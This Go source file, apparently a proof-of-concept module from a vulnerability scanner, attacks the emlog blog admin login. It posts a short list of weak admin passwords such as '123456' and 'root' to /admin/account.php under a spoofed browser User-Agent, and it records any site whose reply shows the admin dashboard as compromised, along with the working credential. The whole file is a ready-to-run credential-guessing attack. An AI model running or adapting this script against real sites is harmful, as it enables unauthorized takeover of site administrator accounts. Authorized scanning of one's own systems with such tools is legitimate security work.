package poc

import (
	"github.com/parnurzeal/gorequest"
	"strings"
)

func emlogDefaultPasswd(url string) {
	url += "/admin/account.php?action=dosignin&s="
	weakPasswords := []string{
		"user=admin&pw=123456",
		"user=admin&pw=password",
		"user=admin&pw=admin123",
		"user=admin&pw=qwerty",
		"user=admin&pw=root",
	}

	// 创建 gorequest 请求对象
	request := gorequest.New()

	// 遍历弱口令列表
	for _, payload := range weakPasswords {
		// 发起 POST 请求
		resp, body, errs := request.Post(url).
			Send(payload).
			Set("Content-Type", "application/x-www-form-urlencoded").
			Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36").
			Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7").
			Set("Cache-Control", "max-age=0").
			Set("Connection", "close").
			End()

		// 如果请求发生错误，跳过
		if errs != nil {
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode == 200 && strings.Contains(body, "管理中心") {
			ListPocInfo = append(ListPocInfo, Flagcve{Url: url, Cve: "弱口令", Flag: payload})
			return
		}
	}
}
